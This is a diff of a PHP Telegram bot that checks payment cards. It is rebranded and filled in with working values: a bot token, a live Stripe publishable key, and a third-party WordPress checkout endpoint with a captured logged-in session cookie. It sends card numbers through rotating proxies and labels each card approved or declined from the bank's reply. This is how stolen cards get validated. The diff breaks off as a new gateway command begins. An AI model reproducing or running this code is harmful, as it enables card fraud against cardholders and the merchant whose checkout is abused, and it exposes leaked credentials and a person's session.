@@ -1,6 +1,8 @@
-
 <?php
 
+////////////////=============[Made with ❤️ by AL CAPONE]===============////////////////
+
+///https://api.telegram.org/bot1918184614:AAHSMvKWqCXyNQ9-V0nqSipXrJV75vFTCto<token>/setwebhook?url=<url>
 
 $botToken = "1918184614:AAHSMvKWqCXyNQ9-V0nqSipXrJV75vFTCto"; // Enter ur bot token
 $website = "https://api.telegram.org/bot".$botToken;
@@ -19,19 +21,19 @@ $message_id = $update["message"]["message_id"];
 //////////=========[Start Command]=========//////////
 
 if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
-sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: Andry Mata</b>");
+sendMessage($chatId, "<b>¡¡Hola a todos!!%0AEscribe /cmds para conocer todos mis comandos!%0A%0ABot Made by AL CAPONE</b>");
 }
 
 //////////=========[Cmds Command]=========//////////
 
 elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
-sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: Andry Mata</b>");
+sendMessage($chatId, "<u>Bin lookup-»</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check-»</u> <code>!sk</code> sk_live%0A<u> To know ur info%0A%0A<b>Bot Made by AL CAPONE </b>");
 }
 
 //////////=========[Info Command]=========//////////
 
 elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
-sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: Andry Mata </b>");
+sendMessage($chatId, "<u>ID-»</u> <code>$userId</code>%0A<u>First Name-»</u> $firstname%0A<u>Username-»</u> @$username%0A%0A<b>Bot Made by AL CAPONE </b>");
 }
 
 //////////=========[Bin Command]=========//////////
@@ -43,8 +45,7 @@ $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
 };
-//$name = $fim['country']['alpha2']; ////country abbreviated example (US)
-//$name = $fim['country']['name']; //// country
+
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -64,7 +65,6 @@ $emoji = GetStr($fim, '"emoji":"', '"');
 $scheme = GetStr($fim, '"scheme":"', '"');
 $type = GetStr($fim, '"type":"', '"');
 $currency = GetStr($fim, '"currency":"', '"');
-///$test2 = GetStr($fim, '"alpha2":"', '"'); ////country abbreviated example (US)
 if(strpos($fim, '"type":"credit"') !== false){
 $bin = 'Credit';
 }else{
@@ -74,7 +74,7 @@ curl_close($ch);
 
  
 curl_close($ch);
-sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Andry Mata </b>');
+sendMessage($chatId, '<b>✅ Bin Valido</b>%0A<b>Bank-»</b> '.$bank.'%0A<b>Country-»</b> '.$name.''.$emoji.'%0A<b>Brand-»</b> '.$brand.'%0A<b>Card-»</b> '.$scheme.'%0A<b>Type-»</b> '.$type.'%0A<b>Currency-»</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 curl_close($ch);
 
@@ -272,20 +272,23 @@ $ip = "Proxy Dead:[".$rotate."]";
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $socks5);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
-curl_setopt($ch, CURLOPT_URL, '.......');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: ......................',
-'accept: ..........................',
-'accept-encoding: .................',
-'accept-language: ..................',
-'content-type: .....................',
-'origin: ...........................',
-'referer: ..........................',
-'sec-fetch-dest: ...................',
-'sec-fetch-mode: ...................',
-'sec-fetch-site: ...................',
+'authority: api.stripe.com',
+'method: POST',
+'path: /v1/payment_methods',
+'scheme: https',
+'accept: application/json',
+'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-site',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
 'user-agent: '.$ua.'',
    ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -294,7 +297,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, '.....');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]=10080&billing_details[name]=zack+mclean&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3df213ac-49ac-4b84-b0e2-9deba9b0b72eeb1e9f&muid=419fc3cd-8d7b-482e-bade-96e495b6a1a0305691&sid=58f1941c-ee34-49b0-a24e-585928f64c7756f128&payment_user_agent=stripe.js%2Fc1e00f41%3B+stripe-js-v3%2Fc1e00f41&time_on_page=28409&referrer=https%3A%2F%2Fwww.medigraytion.com%2F&key=pk_live_290LOcAmWN8bBoRk0DCclhYI00yf5QmVmi');
 
  $result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -305,7 +308,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, '.....');
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $socks5);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
-curl_setopt($ch, CURLOPT_URL, '....');
+curl_setopt($ch, CURLOPT_URL, 'https://www.medigraytion.com/wp-admin/admin-ajax.php');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -316,20 +319,49 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: ......................',
-'accept: .........................',
-'accept-language: ................',
-'content-type: ...................',
-'origin: .........................',
-'referer: ........................',
-'sec-fetch-dest: .................',
-'sec-fetch-mode: .................',
-'sec-fetch-site: .................',
+'authority: www.medigraytion.com',
+'method: POST',
+'path: /wp-admin/admin-ajax.php',
+'scheme: https',
+'accept:application/json, text/javascript, */*; q=0.01',
+'accept-language: en-US,en;q=0.9',
+'content-type: multipart/form-data; boundary=----WebKitFormBoundaryip4Mntadw5T4AAj5',
+'cookie: wordpress_sec_d78c3de304fbf92fbd7082b80ab75d9b=juanaflindsey%40gmail.com%7C1607595223%7ChNXjX18idG4o158HAawiz1lQqKN1YAadFRkpuIJy5K8%7Cfc3f197c1018ed7de81c810beb79c2d26bd68a04a9149c0d767c9f6335fbe5b2; _ga=GA1.2.1447429931.1607422337; _gid=GA1.2.1232166314.1607422337; __stripe_mid=419fc3cd-8d7b-482e-bade-96e495b6a1a0305691; __stripe_sid=58f1941c-ee34-49b0-a24e-585928f64c7756f128; wordpress_logged_in_d78c3de304fbf92fbd7082b80ab75d9b=juanaflindsey%40gmail.com%7C1607595223%7ChNXjX18idG4o158HAawiz1lQqKN1YAadFRkpuIJy5K8%7C16e0dca9da7934f53880bcb21fb4f8c19a058d31ed40771011865a25e586b4f5; _gat_gtag_UA_93020771_2=1',
+'origin: https://www.medigraytion.com',
+'referer: https://www.medigraytion.com/signup/monthly/?action=checkout&txn=nn',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-origin',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
 'user-agent: '.$ua.'',
 'x-requested-with: XMLHttpRequest',
 
    ));
-curl_setopt($ch, CURLOPT_POSTFIELDS,'.....');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="mepr_transaction_id"
+
+851
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="address_required"
+
+0
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="card-name"
+
+zack mclean
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="payment_method_id"
+
+pm_1Hw3CzFNTmox1iC2MyNT2Xkp
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="action"
+
+mepr_stripe_confirm_payment
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="mepr_current_url"
+
+https://www.medigraytion.com/signup/monthly/?action=checkout&txn=nn#mepr_jump
+------WebKitFormBoundaryip4Mntadw5T4AAj5--');
   $result2 = curl_exec($ch);
 $cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
  $info = curl_getinfo($ch);
@@ -341,43 +373,43 @@ curl_close($ch);
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
  if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>APROVADA✅</b>%0A<u>RESPONSE-»</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>APROVADA✅/b>%0A<u>RESPONSE-»</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 『 ★ CCN LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>APROVADA✅</b>%0A<u>RESPONSE-»</u> <b> 『 ★ CCN LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>APROVADA✅</b>%0A<u>RESPONSE-»</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by al capone</b>');
 }
 elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 『 ★ CCN MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>APROVADA✅</b>%0A<u>RESPONSE-»</u> <b> 『 ★ CCN MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>APROVADA✅</b>%0A<u>RESPONSE-»</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif (strpos($result2, "do_not_honor")){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>REPROVADA❌</b>%0A<u>RESPONSE-»</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>REPROVADA❌</b>%0A<u>RESPONSE-»</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>REPROVADA❌</b>%0A<u>RESPONSE-»</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif (strpos($result2, "generic_decline")){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>REPROVADA❌</b>%0A<u>RESPONSE-»</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif (strpos($result1, "generic_decline")){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>REPROVADA❌</b>%0A<u>RESPONSE-»</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>REPROVADA❌</b>%0A<u>RESPONSE-»</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand-»</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
-sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>IP-»</u> <b>'.$ip.'</b>%0A<u>STATUS-»</u> <b>REPROVADA❌</b>%0A<u>RESPONSE-»</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank-»</u> '.$bank1.'%0A<u>Country-»</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card-»</u> '.$scheme.'%0A<u>Type-»</u> '.$type.'%0A<u>Gateway-»</u> <b>Stripe</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
 }
 elseif(!$result2){
 sendMessage($chatId, ''.$result2.'');
@@ -387,10 +419,239 @@ sendMessage($chatId, ''.$result2.'');
 curl_close($ch);
 }
 
+//////////=========[Convergepay Command]=========//////////
+elseif ((strpos($message, "!cpay") === 0)||(strpos($message, "/cpay") === 0)){
+$lista = substr($message, 5);
